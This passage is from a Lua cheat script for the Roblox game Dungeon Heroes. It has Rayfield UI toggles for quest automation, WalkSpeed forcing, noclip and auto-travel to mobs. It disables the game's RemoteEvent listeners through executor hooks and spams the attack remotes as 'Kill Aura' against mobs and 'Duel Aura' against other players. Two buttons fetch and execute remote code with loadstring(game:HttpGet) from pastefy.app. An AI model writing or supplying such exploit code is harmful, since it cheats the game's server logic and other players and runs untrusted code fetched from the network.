                RunLobbyQuestsPass(true)
            end)
        end
    })

    TargetTab:CreateButton({
        Name = "Claim All Ready Rewards Now",
        Callback = function()
            task.spawn(function() RunAutoClaims(false) end)
        end
    })

    TargetTab:CreateSection("Automation & Safety Settings")

    TargetTab:CreateToggle({
        Name = "Auto-Pull Missing Food / Gem Frags / Trash from Bank",
        CurrentValue = true,
        Flag = "DH_AutoDailyPullBank",
        Callback = function(Val) Cfg.AutoPullFromBank = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Auto Toggle Combat Flags ON/OFF (PetAura/Mobs/Claim/Replay)",
        CurrentValue = true,
        Flag = "DH_AutoDailyManageCombat",
        Callback = function(Val) Cfg.AutoManageCombat = (Val == true) end
    })

    TargetTab:CreateSlider({
        Name = "Stop Dungeon Queue At X Daily Quests Done",
        Range = {2, 12},
        Increment = 2,
        Suffix = " / 12",
        CurrentValue = 10,
        Flag = "DH_AutoDailyTargetGoal",
        Callback = function(Val) Cfg.TargetDailyGoal = tonumber(Val) or 10 end
    })

    TargetTab:CreateToggle({
        Name = "Auto Lobby Quests (Food, Ruby Gems, Reroll, Sell)",
        CurrentValue = true,
        Flag = "DH_AutoDailyLobby",
        Callback = function(Val) Cfg.DoLobbyQuests = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Auto Travel Distance (TravelStuds)",
        CurrentValue = true,
        Flag = "DH_AutoDailyTravel",
        Callback = function(Val) Cfg.DoTravelStuds = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Allow Spending Keys (Skill Chests & SpendKeys)",
        CurrentValue = true,
        Flag = "DH_AutoDailySpendKeys",
        Callback = function(Val) Cfg.AllowSpendKeys = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Allow Spending Magic Dust (Pet Level & SpendDust)",
        CurrentValue = true,
        Flag = "DH_AutoDailySpendDust",
        Callback = function(Val) Cfg.AllowSpendDust = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Auto Queue Nightmare Dungeons (Last Dungeon for Kills)",
        CurrentValue = true,
        Flag = "DH_AutoDailyDungeonQueue",
        Callback = function(Val) Cfg.DoDungeonQueue = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Auto Queue Marthuun Raid (Nightmare)",
        CurrentValue = true,
        Flag = "DH_AutoDailyRaidDung",
        Callback = function(Val) Cfg.AllowRaidQueue = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Include Event Dungeon Quests",
        CurrentValue = true,
        Flag = "DH_AutoDailyEventDung",
        Callback = function(Val) Cfg.AllowEventQueue = (Val == true) end
    })

    TargetTab:CreateToggle({
        Name = "Include Weekly Quests Auto-Claim & Travel",
        CurrentValue = true,
        Flag = "DH_AutoDailyWeeklyToo",
        Callback = function(Val) Cfg.IncludeWeeklyClaim = (Val == true) end
    })

    TargetTab:CreateSlider({
        Name = "Max Safe Trash Rarity (Sell / Reroll / Infuse)",
        Range = {1, 4},
        Increment = 1,
        Suffix = " MaxRar",
        CurrentValue = 3,
        Flag = "DH_AutoDailyMaxTrashRar",
        Callback = function(Val) Cfg.MaxSafeTrashRarity = tonumber(Val) or 3 end
    })

    -- ==========================================
    -- INIT LISTENERS & FAST BACKGROUND LOOP (0.5s)
    -- ==========================================
    task.spawn(function()
        task.wait(0.4)
        HookQuestChangeListeners()
        if Cfg.AutoClaimEnabled then RunAutoClaims(true) end

        while true do
            task.wait(0.5)
            HookQuestChangeListeners()

            if Cfg.MasterEnabled then
                if IsInLobby() then
                    if not State.Busy then
                        RunLobbyQuestsPass(false)
                    end
                else
                    RunInDungeonMonitor()
                    if Cfg.AutoClaimEnabled then pcall(RunAutoClaims, true) end
                end
            elseif Cfg.AutoClaimEnabled then
                pcall(RunAutoClaims, true)
                task.wait(1.5)
            end
        end
    end)
end

-- ==========================================
-- SPEED CONTROLS (SYNCED TOGGLE + SLIDER + MANUAL INPUT)
-- ==========================================
MainTab:CreateSection("WalkSpeed Controls")
do
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer

    local maxSpeed = 200
    local isToggled = false
    local currentSpeed = 50
    local defaultGameSpeed = 16
    local hasCapturedDefault = false
    local isSyncingSpeed = false

    local SpeedSlider = nil
    local SpeedInput = nil
    local SpeedLockConn = nil

    local function GetHumanoid()
        local Char = Player.Character
        return Char and Char:FindFirstChildOfClass("Humanoid") or nil
    end

    local function DisconnectSpeedLock()
        if SpeedLockConn then
            pcall(function() SpeedLockConn:Disconnect() end)
            SpeedLockConn = nil
        end
    end

    local function UpdateSpeed()
        local Hum = GetHumanoid()
        DisconnectSpeedLock()

        if isToggled then
            if Hum then
                -- Toggle ON hone se pehle game ki asli default speed capture kar lo
                if not hasCapturedDefault then
                    defaultGameSpeed = Hum.WalkSpeed
                    hasCapturedDefault = true
                end

                Hum.WalkSpeed = currentSpeed

                -- Agar game speed reset kare toh custom speed lock rakhega jab tak toggle ON hai
                SpeedLockConn = Hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                    if isToggled and Hum and Hum.Parent and Hum.WalkSpeed ~= currentSpeed then
                        Hum.WalkSpeed = currentSpeed
                    end
                end)
            end
        else
            -- Toggle OFF -> Game ki original default speed restore karke control wapas game ko de do
            if Hum and hasCapturedDefault then
                Hum.WalkSpeed = defaultGameSpeed
            end
            hasCapturedDefault = false
        end
    end

    -- Respawn hone par nayi character ki default speed save karke agar ON hai toh speed lagao
    Player.CharacterAdded:Connect(function(Char)
        local Hum = Char:WaitForChild("Humanoid", 10)
        if not Hum then return end
        task.wait(0.15)
        defaultGameSpeed = Hum.WalkSpeed
        if isToggled then
            hasCapturedDefault = true
            UpdateSpeed()
        else
            hasCapturedDefault = false
        end
    end)

    MainTab:CreateToggle({
        Name = "Enable WalkSpeed",
        CurrentValue = false,
        Flag = "WalkSpeedToggle",
        Callback = function(Value)
            isToggled = (Value == true)
            UpdateSpeed()
        end,
    })

    SpeedSlider = MainTab:CreateSlider({
        Name = "Speed Slider (Max: 200)",
        Range = {0, maxSpeed},
        Increment = 1,
        Suffix = "Speed",
        CurrentValue = 50,
        Flag = "WalkSpeedSlider",
        Callback = function(Value)
            local num = tonumber(Value)
            if not num then return end
            currentSpeed = math.clamp(math.floor(num), 0, maxSpeed)

            -- Slider hilte hi TextBox live sync hoga
            if not isSyncingSpeed and SpeedInput and SpeedInput.Set and tostring(SpeedInput.CurrentValue) ~= tostring(currentSpeed) then
                isSyncingSpeed = true
                pcall(function()
                    SpeedInput:Set(tostring(currentSpeed))
                end)
                isSyncingSpeed = false
            end

            UpdateSpeed()
        end,
    })

    SpeedInput = MainTab:CreateInput({
        Name = "Manual Speed Input (0 - 200)",
        CurrentValue = "50",
        PlaceholderText = "Enter Speed (0 - 200)",
        RemoveTextAfterFocusLost = false,
        Flag = "WalkSpeedInput",
        Callback = function(Text)
            local num = tonumber(Text)
            if num then
                currentSpeed = math.clamp(math.floor(num), 0, maxSpeed)

                -- TextBox badalte hi Slider live sync hoga
                if not isSyncingSpeed and SpeedSlider and SpeedSlider.Set and tonumber(SpeedSlider.CurrentValue) ~= currentSpeed then
                    isSyncingSpeed = true
                    pcall(function()
                        SpeedSlider:Set(currentSpeed)
                    end)
                    isSyncingSpeed = false
                end

                UpdateSpeed()
            else
                -- Galat text type hone par box me valid currentSpeed wapas likh dega
                if not isSyncingSpeed and SpeedInput and SpeedInput.Set then
                    isSyncingSpeed = true
                    pcall(function()
                        SpeedInput:Set(tostring(currentSpeed))
                    end)
                    isSyncingSpeed = false
                end
            end
        end,
    })
end


-- ==========================================
-- SAFE MODE (1-TAP PAUSE ALL / RESTORE ALL — NO FLAG)
-- ==========================================
MainTab:CreateSection("Safe Mode")
do
    local SafeModeActive = false
    local SavedActiveFlags = {}

    -- Pure UI Looks & passive filter/protection flags ko skip karega
    -- taaki Safe Mode me UI theme ya protection shields na udein
    local IgnoredPatterns = {
        "^SidUI_",
        "Protect",
        "Rarity",
        "SpaceGuard",
        "AutoStop",
        "AutoReturn",
        "DuplicateSell",
        "LevelToggle",
        "UseMaxLevel",
        "PrivateToggle",
        "PullBank",
        "ManageCombat",
        "SpendKeys",
        "SpendDust",
        "DailyLobby",
        "DailyTravel",
        "DailyDungeonQueue",
        "DailyEventDung",
        "DailyRaidDung",
        "DailyWeeklyToo",
    }

    local function ShouldSkipFlag(FlagName)
        local NameStr = tostring(FlagName)
        for _, Pattern in ipairs(IgnoredPatterns) do
            if string.find(NameStr, Pattern) then
                return true
            end
        end
        return false
    end

    local function RunWithoutConfigOverwrite(Fn)
        local Lib = Rayfield
        local OrigSave = Lib and Lib.SaveConfiguration
        if Lib and type(OrigSave) == "function" then
            Lib.SaveConfiguration = function() end
        end

        pcall(Fn)

        if Lib and type(OrigSave) == "function" then
            Lib.SaveConfiguration = OrigSave
        end
    end

    MainTab:CreateToggle({
        Name = "Safe Mode (Pause & Restore All Features)",
        CurrentValue = false,
        -- Intentionally NO Flag here!
        Callback = function(Value)
            SafeModeActive = (Value == true)
            local Flags = Rayfield and Rayfield.Flags
            if type(Flags) ~= "table" then return end

            if SafeModeActive then
                table.clear(SavedActiveFlags)
                local PausedCount = 0

                RunWithoutConfigOverwrite(function()
                    for FlagName, Obj in pairs(Flags) do
                        if not ShouldSkipFlag(FlagName)
                            and type(Obj) == "table"
                            and type(Obj.CurrentValue) == "boolean"
                            and Obj.CurrentValue == true
                            and type(Obj.Set) == "function" then

                            table.insert(SavedActiveFlags, FlagName)
                            pcall(function() Obj:Set(false) end)
                            PausedCount = PausedCount + 1
                        end
                    end
                end)

                if Rayfield.Notify then
                    Rayfield:Notify({
                        Title = "Safe Mode: ON",
                        Content = string.format("%d active feature(s) paused safely.", PausedCount),
                        Color = Color3.fromRGB(255, 185, 50),
                        Duration = 2.6
                    })
                end
            else
                local RestoredCount = 0

                RunWithoutConfigOverwrite(function()
                    for _, FlagName in ipairs(SavedActiveFlags) do
                        local Obj = Flags[FlagName]
                        if type(Obj) == "table" and type(Obj.Set) == "function" then
                            pcall(function() Obj:Set(true) end)
                            RestoredCount = RestoredCount + 1
                        end
                    end
                end)

                table.clear(SavedActiveFlags)

                if Rayfield.Notify then
                    Rayfield:Notify({
                        Title = "Safe Mode: OFF",
                        Content = string.format("%d previous feature(s) restored!", RestoredCount),
                        Color = Color3.fromRGB(0, 232, 155),
                        Duration = 2.6
                    })
                end
            end
        end,
    })
end

--====================================================
-- DUNGEON HEROES | BLOCK LAGGY INCOMING REMOTES
-- Blocks: DoEffect, StatusAdded, DamageNumber, PlaySFX,
--         StatusChanged, StatusRemoved, HitboxIndicator, HitEffect
-- Single Toggle | Restores on Toggle Off
--====================================================

do
    local RS = game:GetService("ReplicatedStorage")
    local Remotes = RS:WaitForChild("Remotes")

    local TargetRemoteNames = {
        "DoEffect",
        "StatusAdded",
        "DamageNumber",
        "PlaySFX",
        "StatusChanged",
        "StatusRemoved",
        "HitboxIndicator",
        "HitEffect"
    }

    local BlockUnusualCalls = false
    local DisabledConnections = {}

    local function SetIncomingRemotesBlocked(ShouldBlock)
        if not getconnections then
            warn("Executor does not support getconnections!")
            return
        end

        if ShouldBlock then
            for _, RemoteName in ipairs(TargetRemoteNames) do
                local Remote = Remotes:FindFirstChild(RemoteName)
                if Remote and Remote:IsA("RemoteEvent") then
                    local ok, conns = pcall(getconnections, Remote.OnClientEvent)
                    if ok and type(conns) == "table" then
                        for _, conn in ipairs(conns) do
                            pcall(function()
                                if conn.Disable then
                                    conn:Disable()
                                    DisabledConnections[conn] = true
                                end
                            end)
                        end
                    end
                end
            end
        else
            -- 1. Enable all stored connections
            for conn in pairs(DisabledConnections) do
                pcall(function()
                    if conn.Enable then
                        conn:Enable()
                    end
                end)
            end
            table.clear(DisabledConnections)

            -- 2. Sweep live OnClientEvent connections to ensure full unlock
            for _, RemoteName in ipairs(TargetRemoteNames) do
                local Remote = Remotes:FindFirstChild(RemoteName)
                if Remote and Remote:IsA("RemoteEvent") then
                    local ok, conns = pcall(getconnections, Remote.OnClientEvent)
                    if ok and type(conns) == "table" then
                        for _, conn in ipairs(conns) do
                            pcall(function()
                                if conn.Enable then
                                    conn:Enable()
                                end
                            end)
                        end
                    end
                end
            end
        end
    end

    -- Background guard: catches any newly created connections while toggle is ON
    task.spawn(function()
        while task.wait(1) do
            if BlockUnusualCalls then
                SetIncomingRemotesBlocked(true)
            end
        end
    end)

    MiscellaneousTab:CreateToggle({
        Name = "Disable unusual call ( recommend to on)",
        CurrentValue = false,
        Flag = "DisableUnusualCallToggle",
        Callback = function(Value)
            BlockUnusualCalls = Value
            SetIncomingRemotesBlocked(Value)
        end
    })
end



MainTab:CreateSection("Combat")

local CONFIG = {
KillRange = 200,
AttackSpeed = 0.15
}

local KillEnabled = false
local DuelEnabled = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local PlayerAttackRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PlayerAttack")

-- 1. Mobs Kill Aura Function (TargetDummy Exception)
local function Kill()
task.spawn(function()
while KillEnabled do
task.wait()

local Character = LocalPlayer.Character  
        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  
        local MobsFolder = workspace:FindFirstChild("Mobs")  

        if HRP and MobsFolder then  
            local Targets = {}  

            for _, Mob in ipairs(MobsFolder:GetChildren()) do  
                -- Ignore TargetDummy  
                if Mob.Name ~= "TargetDummy" then  

                    local MobHRP = Mob:FindFirstChild("HumanoidRootPart")  
                    local HP = Mob:GetAttribute("HP")  

                    if MobHRP and HP ~= "0" and HP ~= 0  
                    and not Mob:GetAttribute("Owner")  
                    and (MobHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
                        table.insert(Targets, Mob)  
                    end  
                end  
            end  

            for i = 1, 10 do  
                if not KillEnabled then break end  
                if #Targets > 0 then  
                    PlayerAttackRemote:FireServer(Targets)  
                end  
                task.wait(CONFIG.AttackSpeed)  
            end  
        end  
    end  
end)

end

-- 2. Players Duel Aura Function (Original Logic)
local function DuelKill()
task.spawn(function()
while DuelEnabled do
task.wait()

local Character = LocalPlayer.Character  
        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  

        if HRP then  
            local Targets = {}  

            for _, Player in ipairs(Players:GetPlayers()) do  
                if Player ~= LocalPlayer and Player.Character then  
                    local TargetChar = Player.Character  
                    local TargetHRP = TargetChar:FindFirstChild("HumanoidRootPart")  
                    local Humanoid = TargetChar:FindFirstChildOfClass("Humanoid")  
                    local HPAttr = TargetChar:GetAttribute("HP")  

                    local IsAlive = (Humanoid and Humanoid.Health > 0) or (HPAttr and HPAttr ~= "0" and HPAttr ~= 0)  
                    if Humanoid == nil and HPAttr == nil then  
                        IsAlive = true  
                    end  

                    if TargetHRP and IsAlive and (TargetHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
                        table.insert(Targets, TargetChar)  
                    end  
                end  
            end  

            for i = 1, 10 do  
                if not DuelEnabled then break end  
                if #Targets > 0 then  
                    local args = {  
                        Targets  
                    }  
                    PlayerAttackRemote:FireServer(unpack(args))  
                end  
                task.wait(CONFIG.AttackSpeed)  
            end  
        end  
    end  
end)

end

-- Kill Aura Toggle (For Mobs)
MainTab:CreateToggle({
Name = "Kill Aura",
CurrentValue = false,
Flag = "KillAura",
Callback = function(Value)
KillEnabled = Value
if Value then
Kill()
end
end
})

-- Duel Aura Toggle (For Players)
MainTab:CreateToggle({
Name = "Duel Aura",
CurrentValue = false,
Flag = "DuelAura",
Callback = function(Value)
DuelEnabled = Value
if Value then
DuelKill()
end
end
})

-- Kill Range Slider (Works for both)
MainTab:CreateSlider({
Name = "Kill Range",
Range = {10, 200},
Increment = 5,
Suffix = "Studs",
CurrentValue = 200,
Flag = "KillRange",
Callback = function(Value)
CONFIG.KillRange = Value
end
})

-- Attack Speed Slider (Works for both)
MainTab:CreateSlider({
Name = "Attack Speed (Use Only Default)",
Range = {0.01, 1},
Increment = 0.01,
Suffix = "Seconds",
CurrentValue = 0.15,
Flag = "AttackSpeed",
Callback = function(Value)
CONFIG.AttackSpeed = Value
end
})

-- ================= Pet Aura =======================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local function GetMobsFolder()
	return workspace:FindFirstChild("Mobs")
end

local PetDamage = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PetDamage")
local MobsSystem = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("Mobs"))

local CONFIG = {
	KillRange = 300,
	AttackSpeed = 0.001,
	ClusterRadius = 25
}

-- Cache table taaki har pet ka best attack 1 hi baar scan ho
local CachedBestAttack = {}

local KillEnabled = false
local LoopId = 0

-- Find equipped pet
local function GetMyPet()
	local MobsFolder = GetMobsFolder()
	if not MobsFolder then return nil end

	for _, Mob in ipairs(MobsFolder:GetChildren()) do
		if Mob:GetAttribute("Owner") == LocalPlayer.Name then
			return Mob
		end
	end
	return nil
end

-- Auto-Detect ONLY the #1 Highest Damage Skill of the Equipped Pet
local function GetBestPetAttack(Pet)
	if not Pet then return nil end
	local PetName = Pet.Name

	if CachedBestAttack[PetName] then
		return CachedBestAttack[PetName]
	end

	local Ok, AttacksFolder = pcall(function()
		return MobsSystem:GetMobAttacksFolder(PetName)
	end)

	if not Ok or not AttacksFolder then
		return nil
	end

	local BestSkill = nil
	local BestDamage = -1
	local BestRange = -1
	local BestCooldown = -1

	for _, AttackFolder in ipairs(AttacksFolder:GetChildren()) do
		if AttackFolder:IsA("Folder") and not AttackFolder:FindFirstChild("PetsCannotUse") then
			local RangeObj = AttackFolder:FindFirstChild("AttackRange")
			local CooldownObj = AttackFolder:FindFirstChild("Cooldown")
			local AtkRange = (RangeObj and tonumber(RangeObj.Value)) or 0
			local AtkCooldown = (CooldownObj and tonumber(CooldownObj.Value)) or 0

			for _, Child in ipairs(AttackFolder:GetChildren()) do
				if Child:IsA("BasePart") and not Child:FindFirstChild("IsHeal") then
					-- HitDamage check karo (default = 1)
					local DmgObj = Child:FindFirstChild("HitDamage") or AttackFolder:FindFirstChild("HitDamage")
					local HitDmg = (DmgObj and tonumber(DmgObj.Value)) or 1

					-- Sabse zyada HitDamage wali skill chuno (Tie hone par zyada Range/Cooldown wali Heavy skill)
					local IsBetter = false
					if HitDmg > BestDamage then
						IsBetter = true
					elseif HitDmg == BestDamage then
						if AtkRange > BestRange then
							IsBetter = true
						elseif AtkRange == BestRange and AtkCooldown > BestCooldown then
							IsBetter = true
						end
					end

					if IsBetter then
						BestDamage = HitDmg
						BestRange = AtkRange
						BestCooldown = AtkCooldown
						BestSkill = { AttackFolder.Name, Child.Name, HitDmg }
					end
				end
			end
		end
	end

	if BestSkill then
		CachedBestAttack[PetName] = BestSkill
		print(string.format("[Pet Kill Aura] %s -> Best Skill: %s (%s) | Skill Damage Mult: %s", PetName, BestSkill[1], BestSkill[2], tostring(BestSkill[3])))
		return BestSkill
	end

	return nil
end

-- Check if mob is valid enemy
local function IsValidEnemy(Mob, MyPet)
	if Mob == MyPet then return false end

	-- EXCEPTION: Completely ignore TargetDummy
	if Mob.Name == "TargetDummy" then return false end

	local Owner = Mob:GetAttribute("Owner")
	if Owner ~= nil and Owner ~= "" then return false end

	if string.find(Mob.Name, "Dummy") then return true end

	local HP = tonumber(Mob:GetAttribute("HP"))
	if HP ~= nil then return HP > 0 end

	local Humanoid = Mob:FindFirstChildOfClass("Humanoid")
	if Humanoid then return Humanoid.Health > 0 end

	return true
end

-- Collect enemies in range
local function GetTargets(HRP, MyPet)
	local Targets = {}
	local MobsFolder = GetMobsFolder()
	if not MobsFolder then return Targets end

	for _, Mob in ipairs(MobsFolder:GetChildren()) do
		local MobHRP = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
		if MobHRP and IsValidEnemy(Mob, MyPet) then
			local Distance = (MobHRP.Position - HRP.Position).Magnitude
			if Distance <= CONFIG.KillRange then
				table.insert(Targets, {
					Instance = Mob,
					Position = MobHRP.Position,
					Distance = Distance
				})
			end
		end
	end

	table.sort(Targets, function(a, b)
		return a.Distance < b.Distance
	end)

	return Targets
end

-- Build hit clusters
local function BuildHitClusters(TargetDataList)
	local Clusters = {}
	local Used = {}

	for i, Primary in ipairs(TargetDataList) do
		if not Used[i] then
			Used[i] = true
			local GroupInstances = { Primary.Instance }

			for j = i + 1, #TargetDataList do
				if not Used[j] then
					local Secondary = TargetDataList[j]
					if (Secondary.Position - Primary.Position).Magnitude <= CONFIG.ClusterRadius then
						Used[j] = true
						table.insert(GroupInstances, Secondary.Instance)
					end
				end
			end

			table.insert(Clusters, {
				Mobs = GroupInstances,
				Position = Primary.Position
			})
		end
	end

	return Clusters
end

-- Pet Aura Loop (Fires ONLY the #1 Best Skill)
local function StartKillAura()
	if not KillEnabled then return end

	LoopId += 1
	local CurrentId = LoopId

	task.spawn(function()
		while KillEnabled and LoopId == CurrentId do
			local Character = LocalPlayer.Character
			local HRP = Character and Character:FindFirstChild("HumanoidRootPart")

			if HRP then
				local Pet = GetMyPet()
				local BestAttack = GetBestPetAttack(Pet)

				if Pet and BestAttack then
					local TargetData = GetTargets(HRP, Pet)

					if #TargetData > 0 then
						local Clusters = BuildHitClusters(TargetData)

						for _, Cluster in ipairs(Clusters) do
							if not KillEnabled or LoopId ~= CurrentId then
								break
							end

							PetDamage:FireServer(
								Pet,
								BestAttack[1],
								BestAttack[2],
								Cluster.Mobs,
								Cluster.Position
							)
						end
					end
				end
			end

			task.wait(CONFIG.AttackSpeed)
		end
	end)
end

-- ON/OFF Toggle
MainTab:CreateToggle({
	Name = "Pet Aura ( Lungsen recommended)",
	CurrentValue = false,
	Flag = "PetKillAura",
	Callback = function(Value)
		KillEnabled = Value
		if Value then
			StartKillAura()
		else
			LoopId += 1
		end
	end
})

-- Pet Kill Range
MainTab:CreateSlider({
	Name = "Pet Kill Range",
	Range = {10, 300},
	Increment = 5,
	Suffix = "Studs",
	CurrentValue = 200,
	Flag = "PetKillRange",
	Callback = function(Value)
		CONFIG.KillRange = Value
	end
})

-- Pet Attack Speed
MainTab:CreateSlider({
	Name = "Pet Attack Speed",
	Range = {0.001, 1},
	Increment = 0.01,
	Suffix = "Seconds",
	CurrentValue = 0.001,
	Flag = "PetAttackSpeed",
	Callback = function(Value)
		CONFIG.AttackSpeed = Value
	end
})


-- ==========================================
-- SCRIPT LOADERS (FOLLOW PLAYER & EMOTE V2)
-- ==========================================
MiscellaneousTab:CreateSection("Script Loaders")

MiscellaneousTab:CreateButton({
Name = "Follow Player",
Callback = function()
Rayfield:Notify({
Title = "Script By Sid",
Content = "Loading Follow Player...",
Duration = 2,
Image = 4483362458,
})

task.spawn(function()  
        local ok, err = pcall(function()  
            loadstring(game:HttpGet("https://pastefy.app/OZaP94pM/raw"))()  
        end)  

        if ok then  
            Rayfield:Notify({  
                Title = "Script By Sid",  
                Content = "Follow Player Loaded ✓",  
                Duration = 3,  
                Image = 4483362458,  
            })  
        else  
            warn("Follow Player Script Error:", err)  
        end  
    end)  
end,

})

MiscellaneousTab:CreateButton({
Name = "Emote V2",
Callback = function()
Rayfield:Notify({
Title = "Script By Sid",
Content = "Loading Emote V2...",
Duration = 2,
Image = 4483362458,
})

task.spawn(function()  
        local ok, err = pcall(function()  
            loadstring(game:HttpGet("https://pastefy.app/t7kwsYZn/raw"))()  
        end)  

        if ok then  
            Rayfield:Notify({  
                Title = "Script By Sid",  
                Content = "Emote V2 Loaded ✓",  
                Duration = 3,  
                Image = 4483362458,  
            })  
        else  
            warn("Emote V2 Script Error:", err)  
        end  
    end)  
end,

})

UtilityTab:CreateSection("Tween Mobs")

--========================================================
-- DUNGEON HEROES | AUTO MOBS + PET LOCK + AUTO NOCLIP V4
-- High-Speed Stable (200-1000+) | Zero Velocity Anti-Fling
-- Auto NoClip on Toggle | Upright Lock | Movable Platform
--========================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer

-- CONFIGURATION
local FloatHeight = 30
local MoveSpeed = 250

local PetOffset = Vector3.new(3, 2, 0)

local PlatformSize = Vector3.new(7, 1, 7)
local PlatformOffset = 3.5

local AutoMobs = false
local IsMovingToMob = false
local RunId = 0

local MovementConnection = nil
local NoClipConnection = nil
local SupportPlatform = nil
local OriginalCollideStates = {}

-- CHARACTER HELPERS
local function GetCharacter()
    return Player.Character
end

local function GetHRP()
    local Character = GetCharacter()
    return Character and Character:FindFirstChild("HumanoidRootPart")
end

-- AUTO NOCLIP MANAGEMENT
local function ApplyNoClipStep()
    local Character = GetCharacter()
    if not Character then return end

    for _, Part in ipairs(Character:GetDescendants()) do
        if Part:IsA("BasePart") then
            if OriginalCollideStates[Part] == nil then
                OriginalCollideStates[Part] = Part.CanCollide
            end
            Part.CanCollide = false
        end
    end
end

local function RestoreCharacterCollision()
    local Character = GetCharacter()
    if Character then
        for _, Part in ipairs(Character:GetDescendants()) do
            if Part:IsA("BasePart") then
                if OriginalCollideStates[Part] ~= nil then
                    Part.CanCollide = OriginalCollideStates[Part]
                elseif Part.Name == "HumanoidRootPart" or Part.Name == "Torso" or Part.Name == "UpperTorso" or Part.Name == "LowerTorso" then
                    Part.CanCollide = true
                end
            end
        end
    end
    table.clear(OriginalCollideStates)
end

-- EQUIPPED PET
local function GetMyPet()
    local MobsFolder = workspace:FindFirstChild("Mobs")
    if not MobsFolder then return nil end

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        if Mob:GetAttribute("Owner") == Player.Name then
            return Mob
        end
    end

    return nil
end

-- PET ROOT
local function GetPetRoot(Pet)
    if not Pet then return nil end

    if Pet:IsA("BasePart") then
        return Pet
    end

    if Pet:IsA("Model") then
        return Pet:FindFirstChild("HumanoidRootPart")
            or Pet.PrimaryPart
            or Pet:FindFirstChildWhichIsA("BasePart", true)
    end

    return nil
end

-- PET FOLLOW (ZERO VELOCITY STABILIZED)
local function LockPetToPlayer(Root)
    local Pet = GetMyPet()
    if not Pet or not Pet.Parent then return end

    local PetRoot = GetPetRoot(Pet)
    if not PetRoot then return end

    local TargetPosition = Root.CFrame:PointToWorldSpace(PetOffset)
    local Difference = TargetPosition - PetRoot.Position

    if Pet:IsA("Model") then
        Pet:PivotTo(Pet:GetPivot() + Difference)
    elseif Pet:IsA("BasePart") then
        Pet.CFrame = CFrame.new(TargetPosition) * Pet.CFrame.Rotation
    end

    PetRoot.AssemblyLinearVelocity = Vector3.zero
    PetRoot.AssemblyAngularVelocity = Vector3.zero
end

-- CREATE OR UPDATE PLATFORM
local function CreatePlatform(Root)
    if SupportPlatform and SupportPlatform.Parent then
        SupportPlatform.Anchored = true
        SupportPlatform.CanCollide = true
        SupportPlatform.AssemblyLinearVelocity = Vector3.zero
        SupportPlatform.AssemblyAngularVelocity = Vector3.zero

        SupportPlatform.CFrame = CFrame.new(
            Root.Position - Vector3.new(0, PlatformOffset, 0)
        )
        return
    end

    local Platform = Instance.new("Part")
    Platform.Name = "AutoMobs_SupportPlatform"
    Platform.Size = PlatformSize
    Platform.Anchored = true
    Platform.CanCollide = true
    Platform.CanTouch = false
    Platform.CanQuery = false

    Platform.Transparency = 0.35
    Platform.Material = Enum.Material.ForceField
    Platform.Color = Color3.fromRGB(130, 80, 255)

    Platform.CFrame = CFrame.new(
        Root.Position - Vector3.new(0, PlatformOffset, 0)
    )

    Platform.Parent = workspace
    SupportPlatform = Platform
end

-- RELEASE PLATFORM
local function ReleasePlatform()
    if SupportPlatform and SupportPlatform.Parent then
        SupportPlatform.Anchored = false
        SupportPlatform.CanCollide = true
    end
end

-- FIND NEAREST MOB IN ENTIRE DUNGEON
local function GetNearestMob()
    local Root = GetHRP()
    if not Root then return nil end

    local MobsFolder = workspace:FindFirstChild("Mobs")
    if not MobsFolder then return nil end

    local NearestMob = nil
    local ShortestDistance = math.huge

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        local Owner = Mob:GetAttribute("Owner")
        local HP = Mob:GetAttribute("HP")

        -- Ignore TargetDummy and owned pets
        if Mob.Name ~= "TargetDummy" and (Owner == nil or Owner == "") then
            local MobRoot = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
            local ValidHP = (HP == nil) or (tonumber(HP) ~= nil and tonumber(HP) > 0)

            if MobRoot and ValidHP then
                local Distance = (MobRoot.Position - Root.Position).Magnitude
                if Distance < ShortestDistance then
                    ShortestDistance = Distance
                    NearestMob = Mob
                end
            end
        end
    end

    return NearestMob
end

-- STOP AUTO MOBS + DISABLE NOCLIP
local function StopAutoMobs()
    AutoMobs = false
    IsMovingToMob = false
    RunId += 1

    if MovementConnection then
        MovementConnection:Disconnect()
        MovementConnection = nil
    end

    if NoClipConnection then
        NoClipConnection:Disconnect()
        NoClipConnection = nil
    end

    RestoreCharacterCollision()

    local Root = GetHRP()
    if Root then
        Root.AssemblyLinearVelocity = Vector3.zero
        Root.AssemblyAngularVelocity = Vector3.zero
    end

    ReleasePlatform()
end

-- START AUTO MOBS + ENABLE AUTO NOCLIP
local function StartAutoMobs()
    StopAutoMobs()

    RunId += 1
    local CurrentRun = RunId

    AutoMobs = true

    -- 1. Stepped Connection for Instant Auto-NoClip (Prevents wall/pillar collision at 200-1000+ speed)
    NoClipConnection = RunService.Stepped:Connect(function()
        if not AutoMobs or RunId ~= CurrentRun then
            return
        end

        if IsMovingToMob then
            ApplyNoClipStep()
        end
    end)

    -- 2. Heartbeat Connection for Smooth High-Speed CFrame Movement & Velocity Lock
    MovementConnection = RunService.Heartbeat:Connect(function(DeltaTime)
        if not AutoMobs or RunId ~= CurrentRun then
            return
        end

        local StepTime = math.clamp(DeltaTime, 0.001, 0.1)

        pcall(function()
            local Character = GetCharacter()
